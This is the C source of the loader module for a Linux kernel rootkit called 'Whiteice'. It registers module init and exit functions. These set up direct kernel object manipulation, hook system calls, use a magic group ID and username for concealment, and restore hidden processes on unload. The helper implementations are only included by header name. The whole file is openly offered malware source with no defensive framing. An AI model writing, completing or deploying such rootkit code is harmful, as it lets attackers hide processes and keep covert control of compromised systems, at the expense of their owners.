#include "defs.h"
#include "loader.h"
#include "config.c"
#include "dkom.h"
#include "hooker.h"

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("NoSuch / Whiteice Rootkit");
MODULE_DESCRIPTION("Whiteice Kernel Rootkit Loader");
MODULE_VERSION("0.1");

int whiteice_init(void) {
    printk(KERN_INFO "\n[whiteice:core] Initializing Whiteice rootkit...\n");
    printk(KERN_INFO "[whiteice:core] [MAGIC_GID=%d] [MAGIC_USER=%s]\n", magic_gid, MAGIC_USERNAME);

    init_dkom();
    
    if (init_hooks() != 0) {
        printk(KERN_ERR "[whiteice:core] Failed to hook syscalls\n");
        return -1;
    }

    printk(KERN_INFO "[whiteice:core] Rootkit modules initialized\n");
    return 0;
}

void whiteice_exit(void) {
    printk(KERN_INFO "[whiteice:core] Unloading Whiteice rootkit...\n");

    cleanup_hooks();
    restore_hidden_processes();

    printk(KERN_INFO "[whiteice:core] Whiteice removed\n");
}

module_init(whiteice_init);
module_exit(whiteice_exit);
